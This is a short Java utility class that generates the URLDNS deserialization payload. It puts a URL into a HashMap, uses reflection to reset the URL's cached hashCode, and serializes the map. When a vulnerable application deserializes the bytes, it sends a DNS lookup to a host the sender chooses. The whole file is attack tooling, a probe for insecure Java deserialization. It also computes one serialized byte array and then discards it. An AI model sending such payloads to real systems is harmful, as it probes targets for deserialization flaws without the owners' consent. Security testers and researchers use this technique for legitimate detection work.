package util;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSUtils {
    private final String url;
    public URLDNSUtils(String url){
        this.url = url;
    }
    public byte[] getBytes() throws Exception {
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        URL u=new URL(url);
        hashmap.put(u,"Squirt1e");
        Class clazz=u.getClass();
        Field hashcode=clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(u,-1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

        objectOutputStream.writeObject(hashmap);
        byte[] bytes1 = byteArrayOutputStream.toByteArray();
//        String s = base64Encode(bytes1);
        return SerializerUtils.serialize(hashmap);
    }
}
